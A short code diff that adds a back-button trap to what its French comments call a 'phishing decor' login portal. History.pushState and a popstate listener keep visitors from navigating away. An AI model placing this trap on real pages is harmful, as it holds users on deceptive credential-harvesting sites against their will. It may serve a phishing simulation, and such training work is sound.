@@ -88,6 +88,12 @@ input::placeholder{color:#333}
   </div>
 </div>
 <script>
+// Piege de navigation (decor phishing) : le bouton "precedent" ne quitte pas la page.
+// Le visiteur reste bloque sur le portail ; il doit recharger la page pour repartir.
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', function(){
+  history.pushState(null, '', location.href);
+});
 let attempts=0;
 function tryLogin(){
   const u=document.getElementById('user');
